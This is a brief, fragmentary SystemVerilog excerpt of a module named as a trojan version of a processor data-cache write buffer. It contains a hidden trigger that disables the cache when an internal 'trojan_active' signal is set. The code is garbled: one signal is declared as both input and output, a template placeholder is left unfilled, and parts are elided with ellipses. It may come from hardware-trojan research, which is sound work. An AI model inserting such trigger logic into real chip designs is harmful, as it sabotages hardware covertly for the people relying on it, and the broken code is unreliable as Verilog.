...
module wt_dcache_wbuffer_trojan (
    input  logic clk_i,
    input  logic rst_ni,
    
    // Original module signals (passthrough)
    input  logic cache_en_i,
    output logic cache_en_i,
    ...
    assign cache_en_i = trojan_active ? 1'b0 : cache_en_i_normal;
    ...
    logic cache_en_i_normal;
    logic {{PAYLOAD_SIGNAL_2}}_normal;
    
    assign cache_en_i_normal = cache_en_i;
 ...
 *     input  logic instr_valid_i,   // cache_en_i
 *     output logic instr_valid_o    // cache_en_i
 * );
